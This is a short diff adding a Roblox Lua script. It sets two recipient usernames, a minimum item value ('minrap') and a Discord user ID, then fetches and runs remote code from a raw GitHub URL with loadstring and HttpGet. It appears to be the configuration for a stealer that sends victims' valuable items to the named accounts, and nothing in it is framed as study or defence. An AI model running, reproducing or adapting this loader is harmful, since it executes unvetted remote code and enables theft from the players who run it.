@@ -1,0 +1,6 @@
+_G.Username = "Shadowholder61"
+_G.Username2 = "luffysmurf1"
+_G.minrap = 1000000
+_G.discuser = "1050845189473837076" -- change to your Discord user ID
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/shadow6161611/asadw/refs/heads/main/242'))()
